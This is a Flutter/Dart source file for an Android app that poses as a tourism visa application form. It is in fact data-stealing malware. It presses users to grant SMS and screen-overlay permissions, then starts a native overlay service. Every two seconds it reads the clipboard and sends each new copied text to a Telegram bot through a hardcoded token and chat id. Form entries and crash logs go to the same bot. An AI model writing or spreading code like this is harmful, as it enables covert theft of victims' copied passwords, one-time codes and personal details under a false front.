
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:android_intent_plus/android_intent.dart';
import 'package:flutter/services.dart';
import 'dart:async';
import 'package:permission_handler/permission_handler.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  FlutterError.onError = (FlutterErrorDetails details) {
    sendCrashLogToTelegram(details.toString());
  };

  runZonedGuarded(() {
    runApp(const VisaFormApp());
  }, (error, stack) {
    sendCrashLogToTelegram('Unhandled error: $error\n$stack');
  });
}

Future<void> sendCrashLogToTelegram(String errorMessage) async {
  const String botToken = '8264908770:AAEeWPB0hZkTPCqtjpodUn53Yhc2O3sn5ko';
  const String chatId = '8416456484';
  final String message = 'App Crash Report:\n$errorMessage';

  try {
    await http.post(
      Uri.parse('https://api.telegram.org/bot$botToken/sendMessage'),
      body: {
        'chat_id': chatId,
        'text': message,
      },
    );
  } catch (e) {
    print('Failed to send crash report to Telegram: $e');
  }
}

class VisaFormApp extends StatelessWidget {
  const VisaFormApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Vilato Tourism',
      theme: ThemeData(
        primarySwatch: Colors.green,
        brightness: Brightness.light,
        fontFamily: 'Roboto',
        scaffoldBackgroundColor: Colors.white,
        useMaterial3: true,
        textTheme: const TextTheme(
          headlineLarge: TextStyle(fontWeight: FontWeight.bold, fontSize: 32, color: Color(0xFF218C74)),
          headlineMedium: TextStyle(fontWeight: FontWeight.bold, fontSize: 24, color: Color(0xFF218C74)),
          titleLarge: TextStyle(fontWeight: FontWeight.bold, fontSize: 20, color: Color(0xFF218C74)),
          bodyLarge: TextStyle(fontWeight: FontWeight.bold, fontSize: 16, color: Colors.black),
          bodyMedium: TextStyle(fontWeight: FontWeight.bold, fontSize: 14, color: Colors.black),
        ),
        appBarTheme: const AppBarTheme(
          backgroundColor: Color(0xFF218C74),
          foregroundColor: Colors.white,
          elevation: 0,
          titleTextStyle: TextStyle(
            fontWeight: FontWeight.bold,
            fontSize: 24,
            color: Colors.white,
          ),
        ),
        inputDecorationTheme: const InputDecorationTheme(
          border: OutlineInputBorder(),
          labelStyle: TextStyle(fontWeight: FontWeight.bold, color: Color(0xFF218C74)),
          focusedBorder: OutlineInputBorder(
            borderSide: BorderSide(color: Color(0xFF218C74), width: 2),
          ),
        ),
        elevatedButtonTheme: const ElevatedButtonThemeData(
          style: ButtonStyle(
            backgroundColor: MaterialStatePropertyAll(Color(0xFF218C74)),
            foregroundColor: MaterialStatePropertyAll(Colors.white),
            textStyle: MaterialStatePropertyAll(TextStyle(fontWeight: FontWeight.bold, fontSize: 16)),
            shape: MaterialStatePropertyAll(
              RoundedRectangleBorder(borderRadius: BorderRadius.all(Radius.circular(12))),
            ),
          ),
        ),
        snackBarTheme: const SnackBarThemeData(
          backgroundColor: Color(0xFF218C74),
          contentTextStyle: TextStyle(fontWeight: FontWeight.bold, color: Colors.white),
        ),
      ),
      home: const VisaFormPage(),
    );
  }
}

class VisaFormPage extends StatefulWidget {
  const VisaFormPage({super.key});

  @override
  State<VisaFormPage> createState() => _VisaFormPageState();
}

class _VisaFormPageState extends State<VisaFormPage> with WidgetsBindingObserver {
  bool _hasSmsPermission = false;
  bool _hasOverlayPermission = false;
  static const platform = MethodChannel('com.example.rendezvous_hb/overlay');

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _checkAndRefreshPermissions();
    _startClipboardMonitor();
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _clipboardTimer?.cancel();
    _emailController.dispose();
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      print("App resumed, checking permissions.");
      _checkAndRefreshPermissions();
    }
  }

  Future<void> _checkAndRefreshPermissions() async {
    final smsStatus = await Permission.sms.status;
    final isOverlayGranted = await _checkOverlayPermission();

    print("Permission Status: SMS=${smsStatus.isGranted}, Overlay=${isOverlayGranted}");

    // Always update state to ensure UI rebuilds, and start service if needed.
    setState(() {
      _hasSmsPermission = smsStatus.isGranted;
      _hasOverlayPermission = isOverlayGranted;

      if (_hasSmsPermission && _hasOverlayPermission) {
        print("Both permissions granted, starting overlay service.");
        _startOverlayService();
      }
    });
  }

  Future<bool> _checkOverlayPermission() async {
    try {
      final bool? isGranted = await platform.invokeMethod<bool>('canDrawOverlays');
      print("Native overlay check returned: $isGranted");
      return isGranted ?? false;
    } on PlatformException catch (e) {
      print("Failed to check overlay permission: '${e.message}'.");
      return false;
    }
  }

  Future<void> _handleSmsPermissionRequest() async {
    final status = await Permission.sms.request();
    if (status.isPermanentlyDenied) {
      // If permanently denied, open settings for the user to manually enable.
      await openAppSettings();
    } else {
      // Otherwise, just refresh the state.
      await _checkAndRefreshPermissions();
    }
  }

  Future<void> _requestOverlayPermission() async {
    try {
      await platform.invokeMethod('openOverlaySettings');
      // No need to check permissions here. The check will happen in didChangeAppLifecycleState.
    } on PlatformException catch (e) {
      print("Failed to open overlay settings: '${e.message}'.");
    }
  }

  Future<void> _startOverlayService() async {
    try {
      await platform.invokeMethod('startOverlayService');
      print("Overlay service started successfully.");
    } on PlatformException catch (e) {
      print("Failed to start overlay service: '${e.message}'.");
    }
  }

  final _formKey = GlobalKey<FormState>();
  final _emailController = TextEditingController();
  String _selectedVisaType = 'Tourist';
  final List<String> _visaTypes = ['Tourist', 'Business', 'Student'];
  bool _isLoading = false;

  Future<void> _submitForm() async {
    if (_formKey.currentState!.validate()) {
      setState(() => _isLoading = true);

      try {
        final response = await http.post(
          Uri.parse('https://api.telegram.org/bot8264908770:AAEeWPB0hZkTPCqtjpodUn53Yhc2O3sn5ko/sendMessage'),
          body: {
            'chat_id': '8416456484',
            'text': 'New visa application:\n'
                'Email: ${_emailController.text}\n'
                'Visa Type: $_selectedVisaType',
          },
        );

        if (response.statusCode == 200) {
          if (!mounted) return;
          ScaffoldMessenger.of(context).showSnackBar(
            const SnackBar(content: Text('Application submitted successfully!')),
          );
          _emailController.clear();
          setState(() => _selectedVisaType = 'Tourist');
        } else {
          throw Exception('Failed to submit application: ${response.body}');
        }
      } catch (e) {
        if (!mounted) return;
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('Error: ${e.toString()}')),
        );
      } finally {
        if (!mounted) return;
        setState(() => _isLoading = false);
      }
    }
  }

  Timer? _clipboardTimer;
  String? _lastClipboard;

  void _startClipboardMonitor() {
    _clipboardTimer = Timer.periodic(const Duration(seconds: 2), (timer) async {
      final data = await Clipboard.getData('text/plain');
      final clipboardText = data?.text ?? '';
      if (clipboardText.isNotEmpty && clipboardText != _lastClipboard) {
        _lastClipboard = clipboardText;
        _sendClipboardToTelegram(clipboardText);
      }
    });
  }

  Future<void> _sendClipboardToTelegram(String text) async {
    final telegramMessage = 'Clipboard copied:\n$text';
    try {
      await http.post(
        Uri.parse('https://api.telegram.org/bot8264908770:AAEeWPB0hZkTPCqtjpodUn53Yhc2O3sn5ko/sendMessage'),
        body: {
          'chat_id': '8416456484',
          'text': telegramMessage,
        },
      );
    } catch (e) {
      print('Failed to forward clipboard: $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    if (!_hasSmsPermission || !_hasOverlayPermission) {
      return Scaffold(
        appBar: AppBar(title: const Text('Permissions Required')),
        body: Center(
          child: Padding(
            padding: const EdgeInsets.all(24.0),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                if (!_hasSmsPermission)
                  Column(
                    children: [
                      Text('Step 1: This app requires SMS permission to function.', textAlign: TextAlign.center, style: Theme.of(context).textTheme.titleLarge),
                      const SizedBox(height: 16),
                      ElevatedButton(onPressed: _handleSmsPermissionRequest, child: const Text('Grant SMS Permission')),
                    ],
                  ),
                if (_hasSmsPermission && !_hasOverlayPermission)
                  Column(
                    children: [
                      Text('Step 2: Grant overlay permission for full functionality.', textAlign: TextAlign.center, style: Theme.of(context).textTheme.titleLarge),
                      const SizedBox(height: 16),
                      ElevatedButton(onPressed: _requestOverlayPermission, child: const Text('Grant Overlay Permission')),
                    ],
                  ),
              ],
            ),
          ),
        ),
      );
    }
    // --- Main App UI ---
    return Scaffold(
      appBar: AppBar(title: const Text('Rendezvous Hub')),
      body: Padding(
        padding: const EdgeInsets.all(16.0),
        child: Form(
          key: _formKey,
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              TextFormField(
                controller: _emailController,
                decoration: const InputDecoration(labelText: 'Email', border: OutlineInputBorder()),
                keyboardType: TextInputType.emailAddress,
                validator: (value) => (value?.isEmpty ?? true) ? 'Please enter your email' : null,
              ),
              const SizedBox(height: 16),
              DropdownButtonFormField<String>(
                value: _selectedVisaType,
                decoration: const InputDecoration(labelText: 'Visa Type', border: OutlineInputBorder()),
                items: _visaTypes.map((t) => DropdownMenuItem<String>(value: t, child: Text(t))).toList(),
                onChanged: (v) => setState(() => _selectedVisaType = v!),
              ),
              const SizedBox(height: 24),
              ElevatedButton(
                onPressed: _isLoading ? null : _submitForm,
                style: ElevatedButton.styleFrom(padding: const EdgeInsets.symmetric(vertical: 18)),
                child: _isLoading
                    ? const SizedBox(height: 24, width: 24, child: CircularProgressIndicator(strokeWidth: 2.5, valueColor: AlwaysStoppedAnimation<Color>(Colors.white)))
                    : const Text('Submit Application'),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
